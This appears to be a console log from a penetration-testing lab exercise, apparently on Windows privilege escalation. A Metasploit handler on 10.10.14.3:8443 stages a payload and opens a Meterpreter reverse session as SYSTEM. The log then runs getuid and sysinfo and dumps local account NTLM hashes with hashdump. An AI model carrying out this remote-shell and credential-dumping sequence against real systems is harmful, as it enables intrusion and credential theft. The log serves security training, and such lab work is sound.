[*] https://10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (10.10.14.3:8443 -> 10.129.43.13:52047) at 2021-05-14 13:38:55 -0400


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-WS02
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 6
Meterpreter     : x64/windows


meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
```